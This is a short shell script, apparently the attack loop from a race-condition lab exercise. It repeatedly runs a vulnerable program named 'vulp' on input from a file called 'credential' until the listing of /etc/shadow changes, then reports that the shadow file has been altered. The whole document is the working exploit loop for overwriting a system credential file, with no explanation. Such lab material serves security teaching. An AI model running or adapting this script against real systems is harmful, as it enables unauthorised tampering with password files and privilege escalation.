#!/bin/sh

old=`ls -l /etc/shadow`
new=`ls -l /etc/shadow`
while [ "$old" = "$new" ]
do
    ./vulp < credential
    new=`ls -l /etc/shadow`
done
echo "STOP... shadow file has been changed"
